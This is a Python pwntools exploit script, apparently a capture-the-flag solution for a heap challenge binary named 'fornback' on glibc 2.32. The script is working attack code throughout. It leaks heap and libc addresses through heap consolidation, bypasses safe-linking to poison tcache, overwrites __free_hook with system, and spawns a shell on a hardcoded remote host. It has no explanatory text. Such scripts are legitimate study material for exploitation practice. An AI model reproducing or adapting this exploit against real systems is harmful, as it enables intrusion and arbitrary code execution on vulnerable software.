#!/usr/bin/python3

from pwn import *
import subprocess

def add(idx, length, data):
	p.sendlineafter(b'> ', b'1')
	p.sendlineafter(b'index: ', str(idx).encode())
	p.sendlineafter(b'name: ', str(length).encode())
	p.sendafter(b'Book name: ', data)

def view(idx):
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b'index: ', str(idx).encode())

def edit(idx, data):
	p.sendlineafter(b'> ', b'3')
	p.sendlineafter(b'index: ', str(idx).encode())
	p.sendafter(b'Book name: ', data)

def delete(idx):
	p.sendlineafter(b'> ', b'4')
	p.sendlineafter(b'index: ', str(idx).encode())

exe = context.binary = ELF('./fornback', checksec=False)
libc = ELF('./libc-2.32.so', checksec=False)

context.log_level = 'debug'
# p = process(exe.path)
# p = remote('127.0.0.1', 10170)
p = remote('104.197.118.147', 10170)

################################################
### Stage 1: Fake consolidation to leak heap ###
################################################
add(0, 0xf8, b'0'*8)
add(1, 0xf8, b'1'*8)
add(2, 0x4f8, b'2'*8)
edit(0, b'0'*0xf8)
edit(2, b'2'*0x4f8)
delete(1)

view(1)
p.recvuntil(b'Book name: ')
heap_leak = p.recvline()[:-1]
heap_leak = u64(heap_leak.ljust(8, b'\x00'))
log.info("Heap leak: " + hex(heap_leak))
heap_base = heap_leak << 12
log.info("Heap base: " + hex(heap_base))

################################################
### Stage 2: Heap consolidation to leak libc ###
################################################
add(1, 0xf8, b'1'*8)
payload = flat(
	heap_base + 0x990, heap_base + 0x990
	)
payload = payload.ljust(0xf0, b'2')
payload += flat(0x100)
add(3, 0xf8, payload)

payload = flat(
	0, 0,
	0, 0x1e0,
	heap_base + 0x2b0, heap_base + 0x2b0
	)
edit(0, payload)

payload = b'1'*0xf0 + flat(0x1e0)
edit(1, payload)

delete(2)
delete(0)
delete(1)
add(0, 0x1d8, b'0')
add(1, 0x4f8, b'0')
add(1, 0x4f8, b'0')

view(3)
p.recvuntil(b'Book name: ')
libc_leak = u64(p.recvline()[:-1] + b'\x00\x00')
log.info("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x1c5cf0
log.info("Libc base: " + hex(libc.address))

##########################
### Stage 3: Get shell ###
##########################
payload = flat(
	b'\x00'*0xd8, 0x101,
	((heap_base + 0x3a0) >> 12) ^ (libc.sym['__free_hook'])
	)
edit(0, payload[:-1])

add(0, 0xf8, b'/bin/sh\x00')
add(1, 0xf8, p64(libc.sym['system']))

delete(0)

p.interactive()